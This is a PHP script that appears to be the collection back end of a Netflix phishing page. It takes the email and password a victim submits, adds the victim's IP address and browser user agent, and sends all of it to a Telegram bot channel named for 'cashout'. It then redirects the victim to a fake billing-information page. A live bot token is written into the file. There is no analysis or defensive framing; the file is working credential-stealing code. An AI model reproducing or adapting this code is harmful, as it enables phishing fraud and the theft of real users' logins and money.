<?php
header('Location: /netflix/billing_info');
$Agent=$_SERVER['HTTP_USER_AGENT'];
$Ip=$_SERVER['REMOTE_ADDR'];
$email=$_POST['email'];
$password=$_POST['password'];
$message = $_GET['message'];
$nl="\r\n";
//$message = 'EMAIL: ' . $email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
$message = urlencode("--------NETFLIX-LOGINS--------\nEMAIL:  ".$email."\nPASSWORD: ".$password."\nIP: ".$Ip."\nUSERAGENT: ".$Agent);
$apiToken = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
$chat_id = "@cashout2022158";
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
// Do what you want with result
?>
